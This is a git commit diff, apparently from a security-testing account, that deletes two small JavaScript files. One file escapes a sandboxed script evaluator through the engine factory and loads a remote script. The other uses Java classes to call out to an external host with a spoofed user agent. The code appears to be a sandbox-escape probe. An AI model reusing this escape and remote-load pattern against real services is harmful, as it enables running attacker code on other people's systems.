40e50eb92db56552889bf98ace76eee687e5a81f
IDXTests <idan.adato@sap.com>
2021-02-17 13:00:19 +0200

    delete all

--- df-esc.js
+++
@@ -1,6 +0,0 @@
-var url = Java.type('java.net.URL');
-var myUrl = new url("https://bgtian.life/content"); 
-var con = myUrl.openConnection(); 
-con.setRequestMethod("GET"); 
-con.setRequestProperty("User-Agent", "Gigya User-Agent"); 
-var responseCode = con.getResponseCode(); 
--- df.js
+++
@@ -1,2 +0,0 @@
-this.engine.factory.scriptEngine.eval('load("https://raw.githubusercontent.com/IDXTests/IDXTests/master/df-esc.js");'); 
-//console.log("Hello, World!");
